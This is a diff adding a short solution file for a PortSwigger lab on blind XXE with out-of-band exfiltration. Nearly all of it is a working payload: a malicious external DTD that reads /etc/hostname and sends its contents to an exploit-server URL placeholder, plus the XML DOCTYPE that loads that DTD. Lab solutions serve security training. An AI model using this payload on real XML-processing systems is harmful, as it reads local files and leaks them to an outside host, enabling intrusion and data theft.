@@ -1,0 +1,11 @@
+<!--XXE Injection That Solves The Following Lab:-->
+<!--https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration-->
+
+<!--Create /malicious.dtd, and add this to exploit server-->
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '[INSERT EXPLOIT SERVER URL HERE]/?x=%file;'>">
+%eval;
+%exfiltrate;
+
+<!--Payload:-->
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "[INSERT EXPLOIT SERVER URL HERE]/malicious.dtd"> %xxe;]>
